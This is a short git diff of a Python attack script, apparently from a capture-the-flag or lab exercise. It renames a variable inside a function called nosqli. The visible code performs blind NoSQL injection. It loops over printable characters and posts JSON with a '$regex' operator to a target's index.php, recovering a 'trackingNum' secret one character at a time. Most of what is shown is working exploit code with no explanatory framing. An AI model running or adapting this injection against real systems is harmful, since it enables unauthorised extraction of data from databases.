@@ -11,11 +11,11 @@ headers= {"Content-type":"appliction/json"}
 
 def nosqli():
     tracking_number=""
-    list=string.printable
-    list= list.replace("*","").replace(".","").replace("+","").replace("?","").replace("$","")
+    full_list=string.printable
+    full_list= full_list.replace("*","").replace(".","").replace("+","").replace("?","").replace("$","")
     count=0
     while count < 99:
-        for char in list:
+        for char in full_list:
             data=f'{{"trackingNum":{{"$regex":"^{tracking_number}{char}.*$"}}}}'
             response= requests.post(url=f"http://{target}/index.php", proxies=proxies, headers=headers, verify=False, allow_redirects=True, data=data) 
 
